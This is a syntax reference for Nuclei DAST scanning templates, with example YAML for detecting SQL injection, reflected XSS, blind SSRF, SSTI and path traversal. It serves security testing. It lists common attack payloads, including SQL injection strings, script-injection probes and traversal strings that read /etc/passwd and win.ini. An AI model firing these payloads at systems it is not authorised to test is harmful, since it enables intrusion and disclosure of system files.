# DAST Protocol Reference

Complete syntax reference for Nuclei DAST (Dynamic Application Security Testing) templates.

## Table of Contents
- [Basic Structure](#basic-structure)
- [Fuzzing Configuration](#fuzzing-configuration)
- [Payloads](#payloads)
- [Pre-conditions](#pre-conditions)
- [Examples](#examples)

---

## Basic Structure

```yaml
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
    payloads:
      injection:
        - "'"
        - "\""
        - ";"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "error indicator"
        part: body
```

---

## Fuzzing Configuration

| Option | Type | Description |
|---|---|---|
| `part` | string | Where to inject: `query`, `body`, `path`, `request` |
| `type` | string | Injection type: `postfix`, `replace` |
| `mode` | string | Injection mode: `single` |
| `fuzz` | list | Payload values to inject |
| `keys` | list | Specific parameter names to fuzz |
| `values` | list | Regex patterns to match and replace |

### Part Values
- `query` - Query parameters
- `body` - Request body
- `path` - URL path
- `request` - Full request

### Type Values
- `postfix` - Appends payload after existing value
- `replace` - Replaces matching values entirely

---

## Payloads

Define attack payloads:

```yaml
payloads:
  sqli:
    - "'"
    - "\""
    - "' OR '1'='1"
    - "\" OR \"1\"=\"1"
    - "1' AND 1=1--"
  xss:
    - '<script>alert(1)</script>'
    - '"><img src=x onerror=alert(1)>'
    - "'-alert(1)-'"
  lfi:
    - "../../../../etc/passwd"
    - "..\\..\\..\\windows\\win.ini"
    - "/etc/passwd%00"
```

---

## Pre-conditions

Filter which requests to test:

```yaml
pre-condition:
  - type: dsl
    dsl:
      - 'method == "GET"'
      - 'method != "OPTIONS"'
      - 'contains(content_type, "text/html")'
```

---

## Examples

### SQL Injection Error-Based
```yaml
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
    payloads:
      sqli:
        - "'"
        - "\""
        - "1' AND 1=1--"
        - "1 UNION SELECT NULL--"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{sqli}}"
    stop-at-first-match: true
    matchers:
      - type: regex
        regex:
          - "SQL syntax.{0,500}?MySQL"
          - "Warning.{0,500}?\\Wmysqli?_"
          - "Microsoft OLE DB Provider for ODBC"
          - "ORA-[0-9]{5}"
          - "PostgreSQL.*ERROR"
        part: body
        condition: or
```

### Reflected XSS
```yaml
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
    payloads:
      xss:
        - '<script>alert(document.domain)</script>'
        - '"><img src=x onerror=alert(document.domain)>'
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{xss}}"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(document.domain)</script>"
          - 'onerror=alert(document.domain)'
        part: body
        condition: or
      - type: word
        words:
          - "text/html"
        part: header
```

### Blind SSRF
```yaml
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
    payloads:
      ssrf:
        - "{{interactsh-url}}"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{ssrf}}"
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
```

### SSTI Detection
```yaml
http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'
    payloads:
      ssti:
        - "{{7*7}}"
        - "${7*7}"
        - "#{7*7}"
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{ssti}}"
    stop-at-first-match: true
    matchers:
      - type: word
        words:
          - "49"
        part: body
```

### LFI with Keyed Fuzzing
```yaml
http:
  - payloads:
      lfi:
        - "../../../../etc/passwd"
        - "..\\..\\..\\windows\\win.ini"
        - "/etc/passwd%00"
    fuzzing:
      - part: query
        type: postfix
        keys:
          - "file"
          - "path"
          - "page"
          - "include"
        fuzz:
          - "{{lfi}}"
    stop-at-first-match: true
    matchers:
      - type: regex
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'
          - '\[fonts\]'
        part: body
        condition: or
```
